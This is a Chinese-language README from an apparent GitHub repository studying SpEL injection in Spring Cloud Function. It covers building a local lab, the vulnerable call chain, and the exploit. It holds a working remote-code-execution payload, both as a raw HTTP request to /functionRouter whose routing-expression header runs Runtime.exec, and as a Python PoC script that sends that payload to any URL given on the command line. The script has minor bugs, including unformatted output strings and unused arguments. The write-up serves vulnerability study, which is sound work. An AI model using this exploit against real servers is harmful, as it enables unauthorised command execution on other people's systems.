# SPeL-injection-study

共分为环境搭建及漏洞复现、原理学习、POC编写三部分

一、环境搭建

IDEA新建spring initializr

![图片](https://user-images.githubusercontent.com/90664154/164909353-8e59c6c2-b38d-4bdb-8dcf-251abfb2dde3.png)
![图片](https://user-images.githubusercontent.com/90664154/164909361-5067e7e9-1afa-477a-a581-d8811f7b4cb6.png)
![图片](https://user-images.githubusercontent.com/90664154/164909390-ef235ebe-5f69-4004-ac6a-14c1746dd062.png)
这里生成jar包
![图片](https://user-images.githubusercontent.com/90664154/164909399-52db580e-c85e-46aa-96aa-6aa7996a9393.png)

在终端安装jdk11

java -jar jojoSPeL-0.01-SNAPSHOT.jar  部署jar包

![图片](https://user-images.githubusercontent.com/90664154/164909424-929dd7da-900d-44bb-923c-d9d5b22f5f4a.png)

访问127.0.0.1:8080验证
![图片](https://user-images.githubusercontent.com/90664154/164909431-224e18e6-e58e-4613-abd9-84087e0db1f7.png)

发送POC验证
POST /functionRouter HTTP/1.1
Host: 127.0.0.1:8080
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc")
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

jojo

![图片](https://user-images.githubusercontent.com/90664154/164909439-3dd2662e-1eb7-4231-8ec6-95a7f2a262eb.png)

二、漏洞分析
header头的spring.cloud.function.routing-expression参数调用链：
org.springframework.cloud.function.web.mvc.FunctionController中,
body-> processReques(RoutingFunction)-> FunctionInvocationWrapper.apply-> doApply-> RoutingFunction(apply)-> org.springframework.cloud.function.context.config.RoutingFunction(route)-> this.functionFromExpression()，最终执行，这其中的安全过滤函数不充分
![图片](https://user-images.githubusercontent.com/90664154/164909446-6745d62c-4204-4b51-8efe-f792e9893166.png)

三、Poc编写
# coding=UTF-8
import requests
import sys
import base64
import urllib3
urllib3.disable_warnings()

def calculator(url,ip,port):
    payload ='T(java.lang.Runtime).getRuntime().exec("calc")'
    data ='jojo'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = '/functionRouter'
    allurl = url + path
    try:
        req=requests.post(url=allurl,headers=headers,data=data,verify=False,timeout=3)
        code =req.status_code
        text = req.text
        rsp = '"error":"Internal Server Error"'

        if code == 500 and rsp in text:
            print('{url} 存在漏洞')
        else:
            print('{url} 不存在漏洞')

    except requests.exceptions.RequestException:
        print('[-]{url} 检测超时')
        pass
    except:
        print('[-]{url} 检测异常')
        pass

if __name__ == '__main__' :
    try:
        cmd1 =sys.argv[1]
        cmd2 =sys.argv[2]
        cmd3 =sys.argv[3]
        calculator(cmd1,cmd2,cmd3)
    except:
        print('python jojoSPel.py url ip port')
        pass
